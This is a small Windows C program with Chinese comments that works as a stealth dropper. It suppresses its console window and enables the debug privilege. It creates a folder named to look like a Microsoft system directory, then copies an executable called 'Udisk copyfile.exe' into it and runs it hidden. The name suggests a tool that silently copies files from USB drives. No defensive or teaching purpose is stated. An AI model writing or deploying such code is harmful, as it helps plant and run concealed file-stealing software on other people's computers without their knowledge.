#ifdef _MSC_VER
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#endif
#include <stdio.h>
#include <Windows.h>

BOOL UpPrivilegeValue()
{
	//OpenProcessToken()函数用来打开与进程相关联的访问令牌
	HANDLE hToken = NULL;
	if (FALSE == OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken))
	{
		return FALSE;
	}
	//LookupPrivilegeValue()函数查看系统权限的特权值
	LUID luid;
	if (FALSE == LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
	{
		CloseHandle(hToken);
		return FALSE;
	}
	//调整权限设置
	TOKEN_PRIVILEGES Tok;
	Tok.PrivilegeCount = 1;
	Tok.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	Tok.Privileges[0].Luid = luid;
	if (FALSE == AdjustTokenPrivileges(hToken, FALSE, &Tok, sizeof(Tok), NULL, NULL))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}



void CreateFolder(char* folderName)
{
	// 文件夹不存在则创建文件夹
	if (_access(folderName, 0) == -1)
	{
		_mkdir(folderName);
	}
}

int main()
{
	UpPrivilegeValue();
	CreateFolder("D:\\Program Files");
	CreateFolder("D:\\Program Files\\Microsoft");
	TCHAR szCommand[500] = { 0 };
	sprintf_s(szCommand, sizeof(szCommand), "CMD /C Copy /V /Y \"%s\" \"%s\"", "Udisk copyfile.exe", "D:\\Program Files\\Microsoft");
	WinExec(szCommand, SW_HIDE);
	WinExec("D:\\Program Files\\Microsoft\\Udisk copyfile.exe", SW_HIDE);
	return 0;
}